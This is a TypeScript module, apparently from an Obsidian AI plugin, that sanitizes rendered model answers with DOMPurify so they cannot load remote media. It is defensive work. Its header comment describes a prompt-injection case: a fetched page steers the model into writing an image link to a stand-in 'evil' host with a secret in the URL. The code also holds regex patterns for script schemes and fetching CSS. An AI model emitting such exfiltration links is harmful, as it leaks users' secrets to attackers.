/**
 * Rendered answers must not load remote media: a fetched page could steer the model into writing
 * `![](https://evil/?q=<secret>)`, and the panel would request it on its own. The Markdown is rendered into a
 * container of a window-less document (nothing there starts loading), the result is sanitized in place by DOMPurify
 * with two hooks (below), and only then is it moved into the panel. A remote img/iframe/video/audio/source/embed/object/
 * `<input type=image>` is replaced by a link (http/https) or plain text (protocol-relative), built with h() (text nodes
 * only, never parsed markup); remote SVG `<image>` / `<feImage>` / `<use>` and `<link>` / `<style>` that fetch are removed;
 * a remote `src` / `srcset` / `poster` / `data` / `background` (and a remote `href` on anything but a link) and a `style`
 * that fetches a remote URL lose that attribute. Everything the old code let through stays: local / vault / data media,
 * links (a remote `<a href>` is not loaded), classes, ids, data-* and the other attributes Obsidian renders with.
 *
 * DOMPurify is the tag allow-list and the traversal (it also defends against mutation-XSS: scripts, namespace tricks,
 * comments). Its attribute allow-list is replaced by the hook below, because Obsidian's output carries attributes the
 * default list drops (target, data-href, contenteditable, ...) and URL schemes it does not know (app://, obsidian://):
 * every attribute is kept unless the hook denies it (on* handlers, javascript: / vbscript: / data:text/html URLs, a remote
 * loader, a fetching style).
 *
 * Content added after the Markdown promise resolved (an async code-block processor of another plugin) is handled by a
 * MutationObserver on the panel element that runs the same sanitizer on every added node / changed URL attribute. That is
 * best effort: the observer runs right after the insertion, the browser may already have started the request.
 */
import DOMPurify from "dompurify";
import { h } from "../ui/dom";

export type MarkdownRender = (md: string, into: HTMLElement) => Promise<void>;

const latest = new WeakMap<HTMLElement, number>();
/** The longest renderMarkdownSafely waits for the renderer's promise before it sanitizes what is there. */
export const RENDER_WAIT_MS = 1500;

const MEDIA = new Set(["img", "iframe", "video", "audio", "source", "embed", "object"]);
const REMOTE = /^\s*(https?:)?\/\//i;
const HTTP = /^\s*https?:\/\//i;
/** Attributes that make the browser fetch; on a link element they only fetch on click, so they stay. */
const LOADING_ATTRS = new Set(["src", "srcset", "poster", "data", "background", "lowsrc", "dynsrc", "imagesrcset", "manifest"]);
const HREF_ATTRS = new Set(["href", "xlink:href"]);
/** Attributes whose value is a URL, checked for a script / document scheme. */
const URL_ATTRS = new Set([...LOADING_ATTRS, ...HREF_ATTRS, "action", "formaction", "cite", "ping", "longdesc"]);
/** Elements whose href is a link, not a load. */
const LINKS = new Set(["a", "area"]);
/** SVG elements that load their href. */
const SVG_LOADERS = new Set(["image", "feimage", "use", "mpath", "textpath", "script"]);
const BAD_SCHEME = /^(?:javascript|vbscript|data:text\/html)/i;
const CSS_FETCHES = /(?:url|image-set|image|src|cross-fade|element)\s*\(|@import/i;
const CSS_REMOTE = /(?:^|[\s'"(,])(?:https?:)?\/\//i;

const tagOf = (el: Element): string => el.localName.toLowerCase();

/** The first remote URL of a media element (src, srcset candidates, poster, data), or null. */
function remoteUrl(el: Element): string | null {
  const urls = [el.getAttribute("src"), el.getAttribute("poster"), el.getAttribute("data"),
    ...(el.getAttribute("srcset") ?? "").split(",").map((c) => c.trim().split(/\s+/)[0] ?? "")];
  for (const u of urls) if (u && REMOTE.test(u)) return u.trim();
  return null;
}

/** Whether CSS text (a style attribute or element) refers to a remote URL (comments and escapes are resolved first). */
export function cssLoadsRemote(css: string): boolean {
  const s = css.replace(/\/\*[\s\S]*?\*\//g, "").replace(/\\([0-9a-f]{1,6})\s?|\\([\s\S])/gi,
    (_m, hex: string | undefined, ch: string | undefined) => hex !== undefined ? String.fromCodePoint(Math.min(parseInt(hex, 16) || 0xfffd, 0x10ffff)) : ch ?? "");
  return CSS_FETCHES.test(s) && CSS_REMOTE.test(s);
}

/** A media element that carries a remote URL becomes a link / text; returns whether it did. */
function replaceRemoteMedia(node: Element, root: Element): boolean {
  const tag = tagOf(node);
  if (tag === "input" ? node.getAttribute("type")?.trim().toLowerCase() !== "image" : !MEDIA.has(tag)) return false;
  const url = remoteUrl(node);
  if (url === null) return false;
  // A remote <source> takes its whole <audio>/<video>/<picture> with it (fallback children would not show).
  const parent = node.parentElement;
  const el = tag === "source" && parent && /^(AUDIO|VIDEO|PICTURE)$/.test(parent.tagName) ? parent : node;
  if (!root.contains(el)) return false; // a late <source> whose <video> is outside root: its src attribute is denied instead
  const label = el.getAttribute("alt")?.trim() || el.getAttribute("title")?.trim() || url;
  el.replaceWith(HTTP.test(url) ? h("a", { href: url, target: "_blank", rel: "noopener" }, label) : label === url ? url : `${label} (${url})`);
  return true;
}

/** Built once per window; the hooks read the root being sanitized from `current`. */
let purify: ReturnType<typeof DOMPurify> | null = null;
let current: Element | null = null;

function sanitizer(): ReturnType<typeof DOMPurify> {
  if (purify !== null) return purify;
  const p = DOMPurify(window);
  p.addHook("uponSanitizeElement", (node) => {
    if (!(node instanceof Element) || current === null) return;
    const tag = tagOf(node);
    if (replaceRemoteMedia(node, current)) return;
    if (node.namespaceURI === "http://www.w3.org/2000/svg" && SVG_LOADERS.has(tag)) {
      const href = node.getAttribute("href") ?? node.getAttribute("xlink:href") ?? "";
      if (tag === "script" || REMOTE.test(href) || BAD_SCHEME.test(href.replace(/[\u0000- ]/g, ""))) node.remove();
    } else if (tag === "style" && cssLoadsRemote(node.textContent ?? "")) node.remove();
  });
  p.addHook("uponSanitizeAttribute", (node, data) => {
    const name = data.attrName.toLowerCase(), value = data.attrValue;
    const deny = (): void => { data.keepAttr = false; data.forceKeepAttr = false; };
    if (name.startsWith("on")) return deny();
    if (name === "style") return cssLoadsRemote(value) ? deny() : void (data.forceKeepAttr = true);
    if (URL_ATTRS.has(name)) {
      if (BAD_SCHEME.test(value.replace(/[\u0000- ]/g, ""))) return deny();
      const loads = LOADING_ATTRS.has(name) || (HREF_ATTRS.has(name) && !LINKS.has(tagOf(node)));
      if (loads && (name === "srcset" || name === "imagesrcset"
        ? value.split(",").some((c) => REMOTE.test(c.trim().split(/\s+/)[0] ?? "")) : REMOTE.test(value))) return deny();
    }
    data.forceKeepAttr = true;
  });
  purify = p;
  return p;
}

/** Sanitizes root (its children, and root itself when it is an element that loads something) in place. Throws when
 * DOMPurify cannot run (no window): callers fail closed. */
export function stripRemoteMedia(root: Element): void {
  const p = sanitizer();
  if (!p.isSupported) throw new Error("DOMPurify is not supported here");
  const outer = current;
  current = root;
  try {
    p.sanitize(root, {
      IN_PLACE: true, ADD_TAGS: ["iframe", "embed", "object", "use"], FORBID_TAGS: ["link", "base", "meta"],
      CUSTOM_ELEMENT_HANDLING: { tagNameCheck: /^[a-z][a-z0-9]*-[a-z0-9-]+$/, attributeNameCheck: /./, allowCustomizedBuiltInElements: false },
    });
  } finally { current = outer; }
}

/** A node added to the panel after the render: sanitize it; one DOMPurify refuses as a root (script, link, ...) is removed. */
function sanitizeLate(n: Element): void {
  try { stripRemoteMedia(n); } catch { n.remove(); }
}

const watchers = new WeakMap<HTMLElement, MutationObserver>();
const WATCHED_ATTRS = [...URL_ATTRS, "style"];

/** Keeps sanitizing el: nodes added later and URL / style attributes changed later. */
function watch(el: HTMLElement): void {
  watchers.get(el)?.disconnect();
  watchers.delete(el);
  if (typeof MutationObserver === "undefined") return;
  const mo = new MutationObserver((records) => {
    for (const r of records) {
      if (r.type === "childList") r.addedNodes.forEach((n) => { if (n instanceof Element && el.contains(n)) sanitizeLate(n); });
      else if (r.target instanceof Element && r.target !== el && el.contains(r.target)) sanitizeLate(r.target);
    }
  });
  mo.observe(el, { childList: true, subtree: true, attributes: true, attributeFilter: WATCHED_ATTRS });
  watchers.set(el, mo);
}

/** Renders md through `render` off-screen, sanitizes it, then moves the result into el, replacing what el held
 * (a placeholder such as the streamed plain text stays until the Markdown is ready). */
export async function renderMarkdownSafely(render: MarkdownRender, el: HTMLElement, md: string): Promise<void> {
  const mine = (latest.get(el) ?? 0) + 1;   // a streaming answer renders again and again: only the newest lands
  latest.set(el, mine);
  watchers.get(el)?.disconnect();
  watchers.delete(el);
  const into = document.implementation.createHTMLDocument("").createElement("div");
  let timer: ReturnType<typeof setTimeout> | undefined;
  try {
    // Obsidian's renderer waits for an image to load before it resolves, and in this window-less document it never does
    // (real Obsidian 1.13: any answer with an image stayed on its placeholder). The nodes are in `into` by then, so after
    // RENDER_WAIT_MS the result is sanitized as it stands; whatever a processor adds later is caught by watch().
    const rendering = render(md, into);
    rendering.catch(() => undefined);
    await Promise.race([rendering, new Promise<void>((r) => { timer = setTimeout(r, RENDER_WAIT_MS); })]);
  } catch {
    into.replaceChildren(md); // fail closed to plain text
  } finally { clearTimeout(timer); }
  try {
    stripRemoteMedia(into);
  } catch {
    into.replaceChildren(md); // the sanitizer could not run: plain text, never unsanitized markup
  }
  if (latest.get(el) !== mine) return;
  el.replaceChildren(...[...into.childNodes]);
  watch(el);
}
